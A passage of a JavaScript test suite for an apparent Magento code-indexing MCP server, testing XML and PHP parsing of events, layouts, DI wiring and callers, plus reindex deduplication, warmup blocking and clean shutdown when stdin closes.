  assert(containers.some(c => c === 'product.sidebar'), 'Layout: found "product.sidebar" container');

  const refBlocks = [];
  const refBlockRegex = /<referenceBlock\s+[^>]*name="([^"]+)"[^>]*/g;
  while ((m = refBlockRegex.exec(content)) !== null) refBlocks.push(m[1]);
  assert(refBlocks.some(b => b === 'head.additional'), 'Layout: found "head.additional" referenceBlock');

  // Test handle matching
  const files = layoutFiles.map(f => path.basename(f, '.xml'));
  assert(files.includes('catalog_product_view'), 'Layout: handle name from filename');
  assert(files.includes('checkout_index_index'), 'Layout: checkout handle found');

  // Cleanup
  try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
}

// ─── Event Flow Parsing Tests ──────────────────────────────────

async function testEventFlowParsing() {
  console.log('\n── Event Flow Parsing ──');

  const tmpDir = path.join(__dirname, '..', '.test-tmp-events');
  try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'etc'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'etc', 'frontend'), { recursive: true });

  // Create test events.xml
  writeFileSync(path.join(tmpDir, 'etc', 'events.xml'), `<?xml version="1.0"?>
<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <event name="sales_order_place_after">
    <observer name="order_email" instance="Module\\Observer\\OrderEmailObserver" method="execute"/>
    <observer name="order_index" instance="Module\\Observer\\OrderIndexObserver"/>
  </event>
  <event name="catalog_product_save_after">
    <observer name="reindex_product" instance="Module\\Observer\\ReindexObserver"/>
  </event>
</config>`);

  writeFileSync(path.join(tmpDir, 'etc', 'frontend', 'events.xml'), `<?xml version="1.0"?>
<config>
  <event name="sales_order_place_after">
    <observer name="order_tracking" instance="Module\\Observer\\TrackingObserver"/>
  </event>
</config>`);

  const { readFileSync: readFile } = await import('fs');
  const { glob } = await import('glob');

  // Parse events.xml files
  const eventsFiles = await glob('**/etc/**/events.xml', { cwd: tmpDir, absolute: true, nodir: true });
  assertEq(eventsFiles.length, 2, 'Events: found 2 events.xml files');

  // Parse observers for sales_order_place_after
  const eventName = 'sales_order_place_after';
  const escapedEvent = eventName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const observers = [];

  for (const file of eventsFiles) {
    const content = readFile(file, 'utf-8');
    const eventBlockRegex = new RegExp(`<event\\s+name="${escapedEvent}"[^>]*>([\\s\\S]*?)<\\/event>`, 'g');
    let eventMatch;
    while ((eventMatch = eventBlockRegex.exec(content)) !== null) {
      const block = eventMatch[1];
      const obsRegex = /<observer\s+[^>]*name="([^"]+)"[^>]*instance="([^"]+)"[^>]*(?:method="([^"]+)")?[^>]*\/?>/g;
      let obsMatch;
      while ((obsMatch = obsRegex.exec(block)) !== null) {
        observers.push({
          name: obsMatch[1],
          instance: obsMatch[2],
          method: obsMatch[3] || 'execute',
        });
      }
    }
  }

  assertEq(observers.length, 3, 'Events: found 3 observers for sales_order_place_after');
  assert(observers.some(o => o.name === 'order_email'), 'Events: order_email observer found');
  assert(observers.some(o => o.name === 'order_tracking'), 'Events: order_tracking observer (frontend) found');

  // Verify method extraction
  const emailObs = observers.find(o => o.name === 'order_email');
  assertEq(emailObs.method, 'execute', 'Events: explicit method="execute" parsed');
  const indexObs = observers.find(o => o.name === 'order_index');
  assertEq(indexObs.method, 'execute', 'Events: default method is "execute"');

  // Parse a different event
  const productObservers = [];
  for (const file of eventsFiles) {
    const content = readFile(file, 'utf-8');
    const regex = new RegExp('<event\\s+name="catalog_product_save_after"[^>]*>([\\s\\S]*?)<\\/event>', 'g');
    let m;
    while ((m = regex.exec(content)) !== null) {
      const obsRegex = /<observer\s+[^>]*name="([^"]+)"/g;
      let obsM;
      while ((obsM = obsRegex.exec(m[1])) !== null) {
        productObservers.push(obsM[1]);
      }
    }
  }
  assertEq(productObservers.length, 1, 'Events: 1 observer for catalog_product_save_after');

  try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
}

// ─── Test Finder Logic Tests ───────────────────────────────────

async function testTestFinder() {
  console.log('\n── Test Finder Logic ──');

  const tmpDir = path.join(__dirname, '..', '.test-tmp-tests');
  try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'Test', 'Unit'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'Test', 'Integration'), { recursive: true });

  // Create test PHP files
  writeFileSync(path.join(tmpDir, 'Test', 'Unit', 'ProductRepositoryTest.php'), `<?php
/**
 * @covers ProductRepository
 */
class ProductRepositoryTest extends TestCase
{
    public function testGetById()
    {
        $mock = $this->createMock(ProductInterface::class);
        $this->assertNotNull($mock);
    }

    public function testSave()
    {
        $repo = new ProductRepository();
    }

    public function testDelete()
    {
        // test delete
    }
}`);

  writeFileSync(path.join(tmpDir, 'Test', 'Integration', 'ProductServiceTest.php'), `<?php
use Module\\Model\\ProductRepository;

class ProductServiceTest extends TestCase
{
    public function testServiceCall()
    {
        $repo = $this->getMockBuilder(ProductRepository::class)->getMock();
    }
}`);

  writeFileSync(path.join(tmpDir, 'Test', 'Unit', 'OrderTest.php'), `<?php
class OrderTest extends TestCase
{
    public function testPlace() {}
}`);

  const { readFileSync: readFile } = await import('fs');
  const { glob } = await import('glob');

  // Find tests for ProductRepository
  const testPatterns = [
    `**/*ProductRepositoryTest.php`,
    `**/*ProductRepository*Test.php`,
    `**/Test/**/*ProductRepository*.php`,
  ];

  const testFiles = new Set();
  for (const pattern of testPatterns) {
    const found = await glob(pattern, { cwd: tmpDir, absolute: true, nodir: true });
    for (const f of found) testFiles.add(f);
  }

  assert(testFiles.size >= 1, 'TestFinder: found test files for ProductRepository', `got ${testFiles.size}`);

  // Parse test methods
  for (const file of testFiles) {
    const content = readFile(file, 'utf-8');
    const testMethods = [];
    const methodRegex = /(?:public\s+)?function\s+(test\w+)\s*\(/g;
    let m;
    while ((m = methodRegex.exec(content)) !== null) testMethods.push(m[1]);

    if (file.includes('ProductRepositoryTest')) {
      assertEq(testMethods.length, 3, 'TestFinder: 3 test methods in ProductRepositoryTest');
      assert(testMethods.includes('testGetById'), 'TestFinder: testGetById found');
      assert(testMethods.includes('testSave'), 'TestFinder: testSave found');
      assert(testMethods.includes('testDelete'), 'TestFinder: testDelete found');

      // Check for @covers
      const hasCoverage = content.includes('@covers') && content.includes('ProductRepository');
      assert(hasCoverage, 'TestFinder: @covers annotation detected');

      // Check for mocks
      const hasMock = content.includes('createMock');
      assert(hasMock, 'TestFinder: mock usage detected');
    }
  }

  // OrderTest should NOT match ProductRepository search
  const orderTests = [...testFiles].filter(f => f.includes('OrderTest'));
  assertEq(orderTests.length, 0, 'TestFinder: OrderTest not included in ProductRepository results');

  try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
}

// ─── Impact Analysis Logic Tests ───────────────────────────────

function testImpactAnalysisLogic() {
  console.log('\n── Impact Analysis Logic ──');

  // Test class name short extraction
  function getShortName(className) {
    return className.split('\\').pop();
  }

  assertEq(getShortName('Magento\\Catalog\\Model\\ProductRepository'), 'ProductRepository', 'Impact: short name from FQCN');
  assertEq(getShortName('ProductRepository'), 'ProductRepository', 'Impact: short name from simple name');

  // Test use statement detection
  function hasUseStatement(content, className) {
    return content.includes(`use ${className}`) || content.includes(`\\${className}`);
  }

  const phpContent = `<?php
use Magento\\Catalog\\Api\\ProductRepositoryInterface;

class MyClass
{
    private ProductRepositoryInterface $repo;
}`;

  assert(hasUseStatement(phpContent, 'Magento\\Catalog\\Api\\ProductRepositoryInterface'),
    'Impact: detects use statement');
  assert(!hasUseStatement(phpContent, 'Magento\\Sales\\Model\\Order'),
    'Impact: no false positive for unrelated class');

  // Test instantiation detection
  function hasInstantiation(content, shortName) {
    return content.includes(`new ${shortName}(`);
  }

  const phpContent2 = `<?php
$repo = new ProductRepository($objectManager);`;
  assert(hasInstantiation(phpContent2, 'ProductRepository'), 'Impact: detects new instantiation');
  assert(!hasInstantiation(phpContent2, 'OrderRepository'), 'Impact: no false positive instantiation');

  // Test type hint detection
  function hasTypeHint(content, shortName) {
    return content.includes(`@var ${shortName}`) ||
           content.includes(`@param ${shortName}`) ||
           content.match(new RegExp(`:\\s*${shortName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`));
  }

  const phpContent3 = `<?php
/** @var ProductRepository $repo */
function doStuff(ProductRepository $repo): void {}`;
  assert(hasTypeHint(phpContent3, 'ProductRepository'), 'Impact: detects @var type hint');

  // Reference aggregation
  const references = {
    useStatements: [{ file: 'a.php' }],
    diXmlReferences: [{ type: 'preference', file: 'di.xml' }, { type: 'plugin', file: 'di.xml' }],
    instantiations: [{ file: 'b.php' }],
    typeHints: [],
  };
  const total = references.useStatements.length + references.diXmlReferences.length +
                references.instantiations.length + references.typeHints.length;
  assertEq(total, 4, 'Impact: total reference count correct');
}

// ─── rustSearchAsync Array Guard Tests ─────────────────────────

function testRustSearchAsyncGuards() {
  console.log('\n── rustSearchAsync Array Guards ──');

  // Simulate the guard logic applied to cached values and resp.data
  function guardCacheResult(cached) {
    return Array.isArray(cached) ? cached : [];
  }

  function guardRespData(resp) {
    if (resp.ok && Array.isArray(resp.data)) return resp.data;
    return null; // signals: fall through to cold-start
  }

  function guardColdStart(result) {
    if (!Array.isArray(result)) return [];
    return result;
  }

  // Cache guard: valid array passes through
  const arr = [{ id: 1 }, { id: 2 }];
  assert(guardCacheResult(arr) === arr, 'Cache guard: valid array passes through');
  assertEq(guardCacheResult(arr).length, 2, 'Cache guard: length preserved');

  // Cache guard: non-array returns []
  assertEq(guardCacheResult({}).length, 0, 'Cache guard: object → empty array');
  assertEq(guardCacheResult(null).length, 0, 'Cache guard: null → empty array');
  assertEq(guardCacheResult(undefined).length, 0, 'Cache guard: undefined → empty array');
  assertEq(guardCacheResult('string').length, 0, 'Cache guard: string → empty array');

  // resp.data guard: array passes
  const validResp = { ok: true, data: [{ id: 1 }] };
  assert(Array.isArray(guardRespData(validResp)), 'resp.data guard: array passes');
  assertEq(guardRespData(validResp).length, 1, 'resp.data guard: length correct');

  // resp.data guard: object data falls through (returns null = use cold-start)
  const objResp = { ok: true, data: { results: [] } };
  assert(guardRespData(objResp) === null, 'resp.data guard: object data → null (fall through)');

  // resp.data guard: ok=false falls through
  const failResp = { ok: false, data: [1, 2] };
  assert(guardRespData(failResp) === null, 'resp.data guard: ok=false → null (fall through)');

  // resp.data guard: empty array is valid
  const emptyResp = { ok: true, data: [] };
  assert(Array.isArray(guardRespData(emptyResp)), 'resp.data guard: empty array is valid (was falsy bug)');

  // Cold-start guard: valid array passes
  const coldArr = [{ id: 3 }];
  assert(guardColdStart(coldArr) === coldArr, 'Cold-start guard: valid array passes');

  // Cold-start guard: non-array → []
  assertEq(guardColdStart({}).length, 0, 'Cold-start guard: object → empty array');
  assertEq(guardColdStart(null).length, 0, 'Cold-start guard: null → empty array');
}

// ─── Singleton Serve & Warmup Tests ────────────────────────────

function testSingletonAndWarmup() {
  console.log('\n── Singleton Serve & Warmup ──');

  // Format cache logic
  function checkFormatCache(cacheKey, cached) {
    if (!cached) return null; // no cache
    if (cached.key !== cacheKey) return null; // stale
    return cached.ok;
  }

  assert(checkFormatCache('a|1|100', { key: 'a|1|100', ok: true }) === true, 'Format cache: hit returns ok=true');
  assert(checkFormatCache('a|1|100', { key: 'a|1|100', ok: false }) === false, 'Format cache: hit returns ok=false');
  assert(checkFormatCache('a|1|100', { key: 'b|2|200', ok: true }) === null, 'Format cache: stale key → miss');
  assert(checkFormatCache('a|1|100', null) === null, 'Format cache: no cache → miss');

  // Warmup message logic
  function shouldBlockForWarmup(warmupInProgress, toolName) {
    const indexFreeTools = ['magento_stats', 'magento_analyze_diff', 'magento_complexity',
      'magento_trace_dependency', 'magento_error_parser', 'magento_find_layout',
      'magento_impact_analysis', 'magento_find_event_flow', 'magento_find_test'];
    return warmupInProgress && !indexFreeTools.includes(toolName);
  }

  assert(shouldBlockForWarmup(true, 'magento_search'), 'Warmup: blocks search during warmup');
  assert(shouldBlockForWarmup(true, 'magento_find_plugin'), 'Warmup: blocks find_plugin during warmup');
  assert(!shouldBlockForWarmup(true, 'magento_stats'), 'Warmup: allows stats during warmup');
  assert(!shouldBlockForWarmup(true, 'magento_trace_dependency'), 'Warmup: allows trace_dependency during warmup');
  assert(!shouldBlockForWarmup(false, 'magento_search'), 'Warmup: does not block after warmup');

  // Singleton decision logic
  function shouldStartServe(socketConnected, dbExists, formatOk) {
    if (socketConnected) return 'skip-use-socket'; // secondary instance
    if (!dbExists) return 'skip-no-db';
    if (!formatOk) return 'reindex-then-serve';
    return 'start-serve';
  }

  assertEq(shouldStartServe(true, true, true), 'skip-use-socket', 'Singleton: socket connected → use existing');
  assertEq(shouldStartServe(true, false, false), 'skip-use-socket', 'Singleton: socket always wins');
  assertEq(shouldStartServe(false, true, true), 'start-serve', 'Singleton: primary with good DB → start');
  assertEq(shouldStartServe(false, true, false), 'reindex-then-serve', 'Singleton: bad format → reindex');
  assertEq(shouldStartServe(false, false, false), 'skip-no-db', 'Singleton: no DB → skip');

  // Serve process dedup guard: don't spawn if PID file points to live process
  function shouldSpawnServe(existingServePidAlive) {
    if (existingServePidAlive) return 'skip-reuse';
    return 'spawn';
  }

  assertEq(shouldSpawnServe(true), 'skip-reuse', 'Serve dedup: skip if existing serve is alive');
  assertEq(shouldSpawnServe(false), 'spawn', 'Serve dedup: spawn if no existing serve');

  // Stale lock double-check: after O_EXCL create, re-read must match our PID
  function lockDoubleCheck(writtenPid, readBackPid) {
    return writtenPid === readBackPid;
  }

  assert(lockDoubleCheck(12345, 12345), 'Lock double-check: own PID → pass');
  assert(!lockDoubleCheck(12345, 99999), 'Lock double-check: different PID → fail (race lost)');
}

// ─── Reindex Deduplication Tests ───────────────────────────────

function testReindexDeduplication() {
  console.log('\n── Reindex Deduplication ──');

  // Simulate the PID-file-based reindex deduplication logic
  let pidFileContent = null;

  function writeReindexPid(pid) { pidFileContent = String(pid); }
  function removeReindexPid() { pidFileContent = null; }
  function getRunningReindexPid(processAlive) {
    if (pidFileContent === null) return null;
    const pid = parseInt(pidFileContent, 10);
    if (!pid || isNaN(pid)) return null;
    return processAlive ? pid : null; // simulate process.kill(pid, 0)
  }

  // No PID file → no running reindex
  assert(getRunningReindexPid(false) === null, 'Dedup: no PID file → null');

  // PID file with alive process → reindex running
  writeReindexPid(12345);
  assertEq(getRunningReindexPid(true), 12345, 'Dedup: alive PID → returns PID');

  // PID file with dead process → clean up, return null
  assertEq(getRunningReindexPid(false), null, 'Dedup: dead PID → null (cleaned up)');

  // After cleanup, PID file should be gone
  removeReindexPid();
  assert(getRunningReindexPid(true) === null, 'Dedup: after remove → null');

  // Simulate startBackgroundReindex skip logic
  let reindexStarted = false;
  function startReindex(reindexInProgress, externalPidAlive) {
    if (reindexInProgress) return 'skip-local';
    writeReindexPid(99999);
    const existingPid = externalPidAlive ? 99999 : null;
    removeReindexPid();
    if (existingPid) return 'skip-external';
    reindexStarted = true;
    return 'started';
  }

  assertEq(startReindex(true, false), 'skip-local', 'Dedup: local reindex in progress → skip');
  assertEq(startReindex(false, true), 'skip-external', 'Dedup: external reindex running → skip');
  assert(!reindexStarted, 'Dedup: reindex was not started when skipped');
  assertEq(startReindex(false, false), 'started', 'Dedup: no reindex running → start');
  assert(reindexStarted, 'Dedup: reindex was started');

  // Test that reindex builds to temp path (old DB preserved for queries)
  const dbPath = '/srv/project/.magector/index.db';
  const tempPath = dbPath + '.new';
  assert(tempPath !== dbPath, 'Dedup: temp path differs from main DB path');
  assert(tempPath.endsWith('.new'), 'Dedup: temp path ends with .new');
}

// ─── Reindex Temp Path Logic Tests ─────────────────────────────

function testReindexTempPathLogic() {
  console.log('\n── Reindex Temp Path Logic ──');

  // Test temp path generation
  const dbPath = '/srv/project/.magector/index.db';
  const tempPath = dbPath + '.new';
  const backupPath = dbPath + '.bak';

  assertEq(tempPath, '/srv/project/.magector/index.db.new', 'Reindex: temp path correct');
  assertEq(backupPath, '/srv/project/.magector/index.db.bak', 'Reindex: backup path correct');

  // Test usable DB check logic
  function hasUsableDb(dbPath, dbSize) {
    return dbSize > 100;
  }

  assert(hasUsableDb(dbPath, 170 * 1024 * 1024), 'Reindex: 170MB DB is usable');
  assert(!hasUsableDb(dbPath, 50), 'Reindex: 50-byte DB is not usable');
  assert(!hasUsableDb(dbPath, 0), 'Reindex: empty DB is not usable');

  // Test blocking logic: should NOT block if usable DB exists
  function shouldBlock(reindexInProgress, hasUsableDb, toolName) {
    const indexFreeTools = ['magento_stats', 'magento_analyze_diff', 'magento_complexity',
      'magento_trace_dependency', 'magento_error_parser', 'magento_find_layout',
      'magento_impact_analysis', 'magento_find_event_flow', 'magento_find_test'];
    return reindexInProgress && !hasUsableDb && !indexFreeTools.includes(toolName);
  }

  assert(!shouldBlock(true, true, 'magento_search'), 'Reindex: search NOT blocked when usable DB exists');
  assert(shouldBlock(true, false, 'magento_search'), 'Reindex: search blocked when no usable DB');
  assert(!shouldBlock(true, false, 'magento_trace_dependency'), 'Reindex: index-free tool not blocked');
  assert(!shouldBlock(true, false, 'magento_find_layout'), 'Reindex: find_layout not blocked');
  assert(!shouldBlock(true, false, 'magento_find_event_flow'), 'Reindex: find_event_flow not blocked');
  assert(!shouldBlock(true, false, 'magento_find_test'), 'Reindex: find_test not blocked');
  assert(!shouldBlock(true, false, 'magento_impact_analysis'), 'Reindex: impact_analysis not blocked');
  assert(!shouldBlock(false, false, 'magento_search'), 'Reindex: not blocked when reindex not running');
}

// ─── Stdin Cleanup (orphan prevention) ────────────────────────

async function testStdinCleanup() {
  console.log('\n── Stdin Cleanup (orphan prevention) ──');

  const { spawn } = await import('child_process');
  const serverPath = path.resolve(__dirname, '..', 'src', 'mcp-server.js');

  // Start MCP server, then close stdin — it should exit cleanly
  const child = spawn('node', [serverPath], {
    cwd: path.resolve(__dirname, '..'),
    env: {
      ...process.env,
      MAGENTO_ROOT: '/tmp/magector-test-nonexistent',
    },
    stdio: ['pipe', 'pipe', 'pipe'],
  });

  let stderr = '';
  child.stderr.on('data', (d) => { stderr += d.toString(); });

  // Wait for server to start
  await new Promise((resolve) => {
    const onData = (d) => {
      if (d.toString().includes('Warmup complete') || d.toString().includes('warming up')) {
        child.stderr.off('data', onData);
        resolve();
      }
    };
    child.stderr.on('data', onData);
    // Timeout after 15s
    setTimeout(resolve, 15000);
  });

  // Close stdin — simulates Claude Code disconnecting
  child.stdin.end();

  // Process should exit within 5 seconds
  const exitCode = await Promise.race([
    new Promise((resolve) => child.on('exit', (code) => resolve(code))),
    new Promise((resolve) => setTimeout(() => resolve('timeout'), 5000)),
  ]);

  assert(exitCode !== 'timeout', 'Process exits after stdin close (not orphaned)');
  assertEq(exitCode, 0, 'Exit code is 0 (clean shutdown)');

  // Cleanup just in case
  try { child.kill('SIGKILL'); } catch {}
}

// ─── Find Implementors Tests ────────────────────────────────────

async function testFindImplementors() {
  console.log('\n── Find Implementors ──');

  const tmpDir = path.join(__dirname, '__fixtures_impl');
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Model'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Api'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/etc'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-bar/Model'), { recursive: true });

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Api/WidgetInterface.php'),
    `<?php\nnamespace Acme\\Foo\\Api;\ninterface WidgetInterface {\n    public function run(): void;\n}\n`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Widget.php'),
    `<?php\nnamespace Acme\\Foo\\Model;\nuse Acme\\Foo\\Api\\WidgetInterface;\nclass Widget implements WidgetInterface {\n    public function run(): void {}\n}\n`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-bar/Model/SpecialWidget.php'),
    `<?php\nnamespace Acme\\Bar\\Model;\nuse Acme\\Foo\\Api\\WidgetInterface;\nclass SpecialWidget implements WidgetInterface {\n    public function run(): void {}\n}\n`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/etc/di.xml'),
    `<config><preference for="Acme\\Foo\\Api\\WidgetInterface" type="Acme\\Foo\\Model\\Widget"/></config>`);

  const { glob: globFn } = await import('glob');
  const { readFileSync: readFn } = await import('fs');
  const root = tmpDir;
  const interfaceName = 'Acme\\Foo\\Api\\WidgetInterface';
  const shortName = 'WidgetInterface';

  // DI preferences
  const diFiles = await globFn('**/etc/**/di.xml', { cwd: root, absolute: true, nodir: true });
  const diPrefs = [];
  for (const diFile of diFiles) {
    const content = readFn(diFile, 'utf-8');
    const prefRegex = /<preference\s+for="([^"]+)"\s+type="([^"]+)"\s*\/?>/g;
    let m;
    while ((m = prefRegex.exec(content)) !== null) {
      if (m[1] === interfaceName || m[1].endsWith('\\' + shortName)) diPrefs.push({ for: m[1], type: m[2] });
    }
  }
  assertEq(diPrefs.length, 1, 'findImplementors: finds DI preference');
  assertEq(diPrefs[0].type, 'Acme\\Foo\\Model\\Widget', 'findImplementors: correct preference type');

  // PHP implementors
  const phpFiles = await globFn('**/*.php', { cwd: root, absolute: true, nodir: true });
  const implementsRegex = new RegExp(`implements\\s+[^{]*\\b${shortName}\\b`, 'i');
  const implementors = [];
  for (const phpFile of phpFiles) {
    const content = readFn(phpFile, 'utf-8');
    if (implementsRegex.test(content)) {
      const classMatch = content.match(/class\s+(\w+)/);
      if (classMatch) implementors.push(classMatch[1]);
    }
  }
  assertEq(implementors.length, 2, 'findImplementors: finds 2 PHP implementors');
  assert(implementors.includes('Widget'), 'findImplementors: includes Widget');
  assert(implementors.includes('SpecialWidget'), 'findImplementors: includes SpecialWidget');

  try { rmSync(tmpDir, { recursive: true }); } catch {}
}

// ─── Find Callers Tests ─────────────────────────────────────────

async function testFindCallers() {
  console.log('\n── Find Callers ──');

  const tmpDir = path.join(__dirname, '__fixtures_callers');
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Model'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/etc'), { recursive: true });

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Service.php'),
    `<?php\nnamespace Acme\\Foo\\Model;\nclass Service {\n    public function doWork() {\n        $this->helper->calculate();\n    }\n}\n`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Controller.php'),
    `<?php\nnamespace Acme\\Foo\\Model;\nclass Controller {\n    public function run() {\n        $this->service->doWork();\n    }\n}\n`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/etc/crontab.xml'),
    `<config><group id="default"><job name="test" instance="Acme\\Foo\\Model\\Service" method="doWork"/></group></config>`);

  const { glob: globFn } = await import('glob');
  const { readFileSync: readFn } = await import('fs');
  const root = tmpDir;

  const phpFiles = await globFn('**/*.php', { cwd: root, absolute: true, nodir: true });
  const methodRegex = /(?:->|::)doWork\s*\(/g;
  const callers = [];
  for (const phpFile of phpFiles) {
    const content = readFn(phpFile, 'utf-8');
    if (methodRegex.test(content)) callers.push(phpFile.replace(root + '/', ''));
    methodRegex.lastIndex = 0;
  }
  assertEq(callers.length, 1, 'findCallers: finds 1 PHP file calling ->doWork()');

  const xmlFiles = await globFn('**/etc/**/*.xml', { cwd: root, absolute: true, nodir: true });
  const xmlRefs = [];
  for (const xmlFile of xmlFiles) {
    const content = readFn(xmlFile, 'utf-8');
    if (content.includes('doWork')) xmlRefs.push(xmlFile.replace(root + '/', ''));
  }
  assertEq(xmlRefs.length, 1, 'findCallers: finds XML reference in crontab.xml');

  try { rmSync(tmpDir, { recursive: true }); } catch {}
}

// ─── Find DI Wiring Tests ───────────────────────────────────────

async function testFindDiWiring() {
  console.log('\n── Find DI Wiring ──');

  const tmpDir = path.join(__dirname, '__fixtures_di');
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/etc'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Model'), { recursive: true });

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/etc/di.xml'),
    `<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="urn:magento:framework:ObjectManager/etc/config.xsd">
  <preference for="Acme\\Foo\\Api\\WidgetInterface" type="Acme\\Foo\\Model\\Widget"/>
  <type name="Acme\\Foo\\Model\\Widget">
    <plugin name="test_plugin" type="Acme\\Foo\\Plugin\\WidgetPlugin"/>
    <arguments>
      <argument name="logger" xsi:type="object">Psr\\Log\\LoggerInterface</argument>
    </arguments>
  </type>
  <virtualType name="Acme\\Foo\\Model\\VirtualWidget" type="Acme\\Foo\\Model\\Widget">
    <arguments>
      <argument name="mode" xsi:type="string">virtual</argument>
    </arguments>
  </virtualType>
</config>`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Widget.php'),
    `<?php\nnamespace Acme\\Foo\\Model;\nclass Widget {\n    public function __construct(\n        \\Psr\\Log\\LoggerInterface $logger,\n        string $mode = 'default'\n    ) {}\n}\n`);

  const { glob: globFn } = await import('glob');
  const { readFileSync: readFn } = await import('fs');
  const root = tmpDir;
  const shortLower = 'widget';

  const diFiles = await globFn('**/etc/**/di.xml', { cwd: root, absolute: true, nodir: true });
  let prefCount = 0, pluginCount = 0, vtCount = 0;

  for (const diFile of diFiles) {
    const content = readFn(diFile, 'utf-8');
    if (!content.toLowerCase().includes(shortLower)) continue;

    const prefRegex = /<preference\s+for="([^"]+)"\s+type="([^"]+)"\s*\/?>/g;
    let m;
    while ((m = prefRegex.exec(content)) !== null) {
      if (m[1].toLowerCase().includes(shortLower) || m[2].toLowerCase().includes(shortLower)) prefCount++;
    }

    const typeBlockRegex = /<type\s+name="([^"]+)"[^>]*>([\s\S]*?)<\/type>/g;
    let tm;
    while ((tm = typeBlockRegex.exec(content)) !== null) {
      if (!tm[1].toLowerCase().includes(shortLower)) continue;
      const pluginRegex = /<plugin\s+name="([^"]+)"[^>]*type="([^"]+)"[^>]*/g;
      let pm;
      while ((pm = pluginRegex.exec(tm[2])) !== null) pluginCount++;
    }

    const vtRegex = /<virtualType\s+name="([^"]+)"[^>]*type="([^"]+)"/g;
    while ((m = vtRegex.exec(content)) !== null) {
      if (m[2].toLowerCase().includes(shortLower)) vtCount++;
    }
  }

  assertEq(prefCount, 1, 'findDiWiring: finds 1 preference');
  assertEq(pluginCount, 1, 'findDiWiring: finds 1 plugin');
  assertEq(vtCount, 1, 'findDiWiring: finds 1 virtualType');

  // Constructor from PHP
  const phpFiles = await globFn('**/Widget.php', { cwd: root, absolute: true, nodir: true });
  let ctorArgCount = 0;
  for (const phpFile of phpFiles) {
    const content = readFn(phpFile, 'utf-8');
    const ctorMatch = content.match(/function\s+__construct\s*\(([\s\S]*?)\)\s*[{:]/);
    if (ctorMatch) {
      const paramRegex = /(?:([\w\\]+)\s+)?(\$\w+)/g;
      let pm;
      while ((pm = paramRegex.exec(ctorMatch[1])) !== null) ctorArgCount++;
    }
  }
  assertEq(ctorArgCount, 2, 'findDiWiring: extracts 2 constructor args from PHP');

  try { rmSync(tmpDir, { recursive: true }); } catch {}
}

// ─── Trace Call Chain Tests ─────────────────────────────────────

async function testTraceCallChain() {
  console.log('\n── Trace Call Chain ──');

  const tmpDir = path.join(__dirname, '__fixtures_trace');
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Model'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/etc'), { recursive: true });

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/OrderProcessor.php'),
    `<?php
namespace Acme\\Foo\\Model;
class OrderProcessor {
    private $eventManager;
    private $validator;
    public function __construct(
        \\Magento\\Framework\\Event\\ManagerInterface $eventManager,
        ValidatorInterface $validator
    ) {
        $this->eventManager = $eventManager;
        $this->validator = $validator;
    }
    public function process($order) {
        $this->validateOrder($order);
        $this->eventManager->dispatch('order_process_before', ['order' => $order]);
        $this->validator->validate($order);
    }
    private function validateOrder($order) {
        return $order->getId() > 0;
    }
}
`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/etc/events.xml'),
    `<?xml version="1.0"?>
<config>
  <event name="order_process_before">
    <observer name="test_observer" instance="Acme\\Foo\\Observer\\OrderObserver"/>
  </event>
</config>`);

  const { readFileSync: readFn } = await import('fs');
  const { glob: globFn } = await import('glob');

  // Test method body extraction
  const content = readFn(path.join(tmpDir, 'vendor/acme/module-foo/Model/OrderProcessor.php'), 'utf-8');
  const methodRegex = /function\s+process\s*\([^)]*\)[^{]*\{/;
  const methodStart = content.search(methodRegex);
  assert(methodStart > -1, 'traceCallChain: finds process method');

  // Extract method body
  let braceCount = 0;
  let bodyStart = content.indexOf('{', methodStart);
  let bodyEnd = bodyStart;
  for (let i = bodyStart; i < content.length; i++) {
    if (content[i] === '{') braceCount++;
    if (content[i] === '}') braceCount--;
    if (braceCount === 0) { bodyEnd = i; break; }
  }
  const methodBody = content.slice(bodyStart, bodyEnd + 1);

  // Self-call detection
  const selfCallRegex = /\$this->(\w+)\s*\(/g;
  const selfCalls = [];
  let sc;
  while ((sc = selfCallRegex.exec(methodBody)) !== null) {
    if (sc[1] !== 'process' && sc[1] !== '__construct') selfCalls.push(sc[1]);
  }
  assert(selfCalls.includes('validateOrder'), 'traceCallChain: detects $this->validateOrder()');

  // Dependency call detection
  const depCallRegex = /\$this->(\w+)->(\w+)\s*\(/g;
  const depCalls = [];
  let dc;
  while ((dc = depCallRegex.exec(methodBody)) !== null) {
